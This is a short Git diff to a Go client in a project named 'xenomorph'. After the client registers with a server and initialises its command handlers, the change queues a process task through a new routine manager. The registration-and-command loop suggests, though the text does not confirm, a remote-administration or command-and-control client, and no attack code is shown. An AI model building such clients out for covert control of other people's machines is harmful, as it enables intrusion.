@@ -9,6 +9,8 @@ import (
 	"time"
 
 	"github.com/codevault-llc/xenomorph/internal/netclient/command"
+	"github.com/codevault-llc/xenomorph/internal/netclient/services/routine"
+	"github.com/codevault-llc/xenomorph/internal/netclient/services/routine/tasks"
 	"github.com/codevault-llc/xenomorph/internal/netclient/services/system"
 	"github.com/codevault-llc/xenomorph/internal/secure"
 	"github.com/codevault-llc/xenomorph/pkg/logger"
@@ -78,6 +80,12 @@ func (c *Client) Run() error {
 	c.Send(types.MsgRegistration, 0, 0, infoBytes)
 
 	command.InitCommands()
+
+	routineManager := routine.NewRoutineManager()
+	routineManager.Register(&tasks.ProcessTask{Client: c})
+
+	routineManager.QueueTasks()
+
 
 	for {
 		msgType, _, msgID, payload, err := c.Read()
